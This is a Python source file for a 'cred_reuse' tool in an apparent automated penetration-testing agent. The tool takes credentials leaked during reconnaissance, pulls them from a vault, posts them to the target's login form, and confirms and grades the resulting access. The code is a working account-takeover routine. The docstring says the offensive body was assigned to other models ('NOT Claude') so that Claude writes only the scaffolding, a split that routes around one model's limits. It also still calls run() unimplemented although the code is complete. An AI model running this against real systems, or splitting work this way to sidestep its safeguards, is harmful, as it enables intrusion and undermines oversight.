# agent_alpha/tools/internal/access/cred_reuse.py
"""cred_reuse — internal Beta (STRIKE) tool: REUSE credentials harvested by Alpha.

THIS IS THE CHAIN. Alpha leaks a credential (e.g. DB_PASSWORD via a Laravel debug
page) → vaults it (SecretsManager, encrypted) → writes a CREDENTIAL node whose
secret_ref is the vault id. cred_reuse reads those nodes, retrieves the real value
from the vault, and tries it against the target. "Alpha found an exposed credential"
becomes "Beta logged in with it" — the multi-hop a scanner cannot assemble.

Distinct from default_creds (built-in admin/admin): cred_reuse uses REAL harvested
secrets from the engagement's own recon. Higher relevance when such creds exist.

Boundary (READ BEFORE EDITING):
  * Claude owns: name / phase / required_auth, applies_to(), the injected-deps shape,
    and the finding contract below. Non-offensive.
  * Offensive-body author (GLM/DeepSeek — NOT Claude) owns: run() — resolve each
    CredentialProperties.secret_ref via secrets_manager.retrieve(), apply it through
    the AUTHED transport, VERIFY with a positive auth signal, return CONTENT.
    NotImplementedError until authored.

PREREQUISITE (separate change, RED-tested): Alpha must VAULT the leaked secret
(SecretsManager.store) and set CredentialProperties.secret_ref = the vault id.
Today Alpha discards the value and secret_ref is a proof-path pointer — so there is
nothing to retrieve until that lands.

Conforms to agent_alpha.tools.contracts.Tool (single canonical contract, #6).
required_auth = ACTIVE_APPROVED (active auth attempt, not recon).

run() finding shape (on success) — Beta.step persists + mints refs, REDACTS proof:
    {
      "username": str,
      "access_level": "user" | "admin",
      "credential_node_id": str,       # the Alpha CREDENTIAL node reused → edge source
      "proof_request": dict,           # safe fields only (no raw secret/headers)
      "proof_response": dict,          # safe fields only; Beta.step deep-redacts
      "session_cookie_name": str | None,
    }
The raw secret is NEVER returned (it came from the vault; don't re-expose it). The
cred→access ENABLES edge is built from credential_node_id, completing the chain.
"""

from __future__ import annotations

from typing import Any

from agent_alpha.graph.nodes import NodeType
from agent_alpha.security.secrets import SecretNotFoundError
from agent_alpha.tools.contracts import ResourceBudget, TargetContext, ToolResult
from agent_alpha.tools.internal.access.default_creds import (
    _has_positive_auth_signal,
    _parse_set_cookie,
)


class CredReuseTool:
    """Reuse engagement-harvested credentials against the target."""

    name = "cred_reuse"
    phase = "access"
    required_auth = "ACTIVE_APPROVED"
    mitre_technique = "T1078.003"  # Valid Accounts: Local Accounts (reused harvested cred,
    #                                NOT a default account — distinct from default_creds)

    def __init__(
        self,
        *,
        http_client: Any = None,
        graph_store: Any = None,
        secrets_manager: Any = None,
    ) -> None:
        self._http_client = http_client
        self._graph_store = graph_store
        self._secrets_manager = secrets_manager

    def applies_to(self, ctx: TargetContext) -> float:
        """High when the graph holds harvested credentials to reuse — this is the
        context-aware chain, ranked ABOVE blind default_creds (registry, not the
        agent, decides — K11). Zero without a graph; low when no creds harvested."""
        if self._graph_store is None:
            return 0.0
        creds = self._graph_store.nodes_by_type(NodeType.CREDENTIAL)
        return 0.9 if creds else 0.1

    def run(self, ctx: TargetContext, budget: ResourceBudget) -> ToolResult:
        """Reuse Alpha-harvested credentials: resolve each CREDENTIAL node's
        secret_ref via the vault, apply (username + secret) via POST, VERIFY with
        a positive auth signal, return CONTENT (no raw secret). success=True only
        on verified access. Beta.step persists + redacts + mints refs."""
        if self._http_client is None:
            raise ValueError("CredReuseTool.run requires an injected http_client")
        if self._graph_store is None:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="no graph_store available",
            )
        if self._secrets_manager is None:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="no secrets_manager available",
            )

        cred_nodes = self._graph_store.nodes_by_type(NodeType.CREDENTIAL)
        if not cred_nodes:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="no harvested credentials in graph",
            )

        # ── Baseline (unauthenticated GET) ──────────────────────────
        try:
            baseline = self._http_client.get(ctx.target)
        except Exception:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="baseline request failed",
            )

        requests_used = 1  # baseline counted

        for node in cred_nodes:
            if requests_used >= budget.max_requests:
                break

            props = node.properties
            if not hasattr(props, "secret_ref"):
                continue

            # Resolve the vaulted secret — skip non-vaulted pointers
            try:
                secret = self._secrets_manager.retrieve(props.secret_ref)
            except SecretNotFoundError:
                continue
            except Exception:
                continue

            username = props.username or ""

            # APPLY the credential via POST (form login) — the credential
            # MUST reach the wire (anti-Lyndon #3: no proof-theatre).
            try:
                auth_resp = self._http_client.post(
                    ctx.target,
                    data={"username": username, "password": secret},
                )
                requests_used += 1
            except Exception:
                continue

            # VERIFY: positive auth signal required
            if not _has_positive_auth_signal(auth_resp, baseline):
                continue

            # ── Confirm via session cookie ──────────────────────────
            set_cookie = auth_resp.headers.get("set-cookie", "")
            cookies = _parse_set_cookie(set_cookie)
            confirm_resp = auth_resp  # fallback for redirect/form-gone

            if cookies:
                try:
                    confirm_resp = self._http_client.get(
                        ctx.target,
                        cookies=cookies,
                    )
                    requests_used += 1
                except Exception:
                    continue
                if confirm_resp.text == baseline.text:
                    continue

            # ── Access verified — determine access level ────────────
            body_lower = (confirm_resp.text or "").lower()
            access_level: str = (
                "admin" if ("admin" in body_lower or "administrator" in body_lower) else "user"
            )

            # ── Extract session cookie name (no value — safe) ───────
            session_cookie_name: str | None = None
            if set_cookie:
                first_part = set_cookie.split(";", 1)[0].strip()
                if "=" in first_part:
                    session_cookie_name = first_part.split("=", 1)[0].strip()

            # ── Build finding with safe fields only (NO raw secret) ──
            finding: dict[str, Any] = {
                "username": username,
                "access_level": access_level,
                "credential_node_id": node.id,
                "proof_request": {
                    "method": "POST",
                    "url": ctx.target,
                    "data_keys": ["username", "password"],
                },
                "proof_response": {
                    "status_code": auth_resp.status_code,
                    "header_names": list(auth_resp.headers.keys()),
                    "body_excerpt": (auth_resp.text or "")[:500],
                    "confirm_status_code": confirm_resp.status_code,
                    "confirm_body_excerpt": (confirm_resp.text or "")[:500],
                },
                "session_cookie_name": session_cookie_name,
            }

            return ToolResult(
                tool=self.name,
                success=True,
                confidence=0.9,
                findings=(finding,),
            )

        # ── No harvested credential produced a positive auth signal ───
        return ToolResult(
            tool=self.name,
            success=False,
            confidence=0.0,
            error="no harvested credential produced a positive auth signal",
        )
